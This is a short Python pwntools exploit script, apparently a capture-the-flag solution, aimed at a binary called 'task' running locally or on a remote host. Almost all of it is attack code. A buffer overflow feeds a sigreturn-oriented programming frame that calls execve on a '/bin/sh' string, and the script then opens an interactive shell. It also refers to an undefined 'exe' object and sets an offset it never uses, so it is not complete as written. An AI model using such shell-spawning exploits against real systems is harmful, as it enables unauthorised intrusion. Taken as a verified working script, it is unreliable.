from pwn import *
def start():
    if args.LOCAL:
        return process("./task")
    else:
        return remote(sys.argv[1],sys.argv[2])

io = start()
offset = 8
BINSH = exe.address + 0x1430
payload = b'a'*8
payload += p64(0x41018)
payload += p64(0xf)
payload += p64(0x41015)

frame = SigreturnFrame()
frame.rax = 0x3b            
frame.rdi = BINSH           
frame.rsi = 0x0             
frame.rdx = 0x0             
frame.rip = 0x41015

payload += bytes(frame)
io.sendline(payload)
io.interactive()
